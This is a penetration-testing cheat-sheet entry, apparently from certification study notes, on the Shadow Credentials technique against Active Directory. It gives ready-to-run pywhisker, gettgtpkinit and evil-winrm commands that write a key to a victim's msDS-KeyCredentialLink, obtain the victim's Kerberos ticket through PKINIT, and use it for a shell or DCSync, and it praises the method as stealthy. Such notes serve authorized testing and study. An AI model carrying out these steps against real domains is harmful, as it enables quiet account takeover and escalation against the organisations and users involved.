---
tool: Shadow Credentials
slug: shadow-credentials
kind: technique
stages: [post-compromise]
targets: [windows]
category: Account takeover via msDS-KeyCredentialLink
platforms: [linux]
services: [ldap, kerberos]
ports: [636, 88]
tags: [active directory, kerberos, pkinit, shadow-credentials, pywhisker, acl-abuse]
attack: [T1556, T1098, T1550.003]
summary: If you can write to a victim's msDS-KeyCredentialLink attribute, you can add your own public key as an alternate credential and then authenticate as them with the matching certificate via PKINIT. A quiet, reversible takeover that needs no password reset — the go-to when BloodHound shows an AddKeyCredentialLink edge.
references:
  - pywhisker | https://github.com/ShutdownRepo/pywhisker
  - SpecterOps — Shadow Credentials | https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab
---

## When to reach for it

BloodHound shows you hold `AddKeyCredentialLink` (or generic write) over a user or computer — `GenericWrite`, `GenericAll`, or write to that one attribute. Instead of resetting the target's password (loud and disruptive), add a key credential: write a public key to `msDS-KeyCredentialLink`, keep the private key, and authenticate as the target through PKINIT. The target never loses access, so it is far stealthier than a reset.

## Key flags

- `pywhisker -d DOMAIN -u you -p 'pass' --target VICTIM --action add` — write a key credential and export a PFX.
- `--action list` / `--action remove` / `--action clear` — enumerate or clean up entries (put the attribute back as you found it).
- `--filename` / the printed PFX password — needed next by `gettgtpkinit`.
- Authenticate with `-H hash`, `-k`, or a certificate instead of `-p` where you only hold those.

## Commands

Add a Shadow Credential to the victim and get a PFX back:

```bash
pywhisker -d DOMAIN --dc-ip TARGET -u attacker -p 'Password123' --target victim --action add
```

Exchange the PFX for the victim's TGT, then pass the ticket:

```bash
python3 gettgtpkinit.py -cert-pfx VICTIM.pfx -pfx-pass 'PFXPASS' -dc-ip TARGET DOMAIN/victim /tmp/victim.ccache
export KRB5CCNAME=/tmp/victim.ccache
evil-winrm -i dc01.DOMAIN -r DOMAIN
```

## Workflow

1. Confirm the write right (BloodHound's `AddKeyCredentialLink`, or any generic write on the target).
2. Run `pywhisker --action add`; note the PFX path and its password.
3. Turn the PFX into a TGT with `gettgtpkinit` — see [Pass the Certificate](/cpts/#tool-pass-the-certificate).
4. `export KRB5CCNAME` and act as the victim (shell, DCSync, onward enumeration).
5. **Clean up**: `pywhisker --action remove` (or `clear`) to restore `msDS-KeyCredentialLink`.

## Notes

The target needs the key-trust prerequisites in place — a 2016+ DC and a domain configured for PKINIT (AD CS or at least a DC certificate). Where that holds, this is one of the cleanest ways to cash in a write primitive from a Linux box, since Certipy's `shadow auto` can also do the whole add-authenticate-remove cycle in a single step. It pairs with the [ACL abuse note](/cpts/#tool-acl-abuse) (how you get the write right) and [Pass the Certificate](/cpts/#tool-pass-the-certificate) (what you do with the resulting PFX). Always remove the entry afterwards to avoid leaving a durable backdoor on the object.
